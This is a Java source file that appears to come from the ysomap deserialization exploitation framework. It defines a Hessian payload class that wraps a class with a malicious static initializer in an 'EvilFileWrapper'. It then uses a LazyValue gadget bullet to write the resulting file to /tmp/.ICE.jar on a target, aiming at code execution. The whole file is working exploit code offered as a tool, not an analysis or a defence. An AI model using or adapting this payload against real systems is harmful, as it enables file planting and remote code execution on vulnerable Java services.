package ysomap.payloads.hessian;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LazyValueWithFileWrite1Bullet;
import ysomap.bullets.objects.ClassWithEvilStaticBlockFromExistClazz;
import ysomap.common.annotation.*;
import ysomap.payloads.Payload;
import ysomap.payloads.java.objects.EvilFileWrapper;

/**
 * @author wh1t3p1g
 * @since 2022/4/18
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.HESSIAN })
@Dependencies({"hessian"})
@Require(bullets = {
        "ClassWithEvilStaticBlockFromExistClazz"}, param = false)
public class LazyValueForHessianWithFileWrite1 extends LazyValueForHessian {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ClassWithEvilStaticBlockFromExistClazz.newInstance(args);
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof byte[];
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Payload wrapper = new EvilFileWrapper();
        wrapper.setBullet(bullet);
        Bullet bullet = new LazyValueWithFileWrite1Bullet();
        bullet.set("localFile", "dynamic");
        bullet.set("filepath", "/tmp/.ICE.jar");
        bullet.set("data", wrapper.getObject());

        return super.pack(bullet.getObject());
    }
}
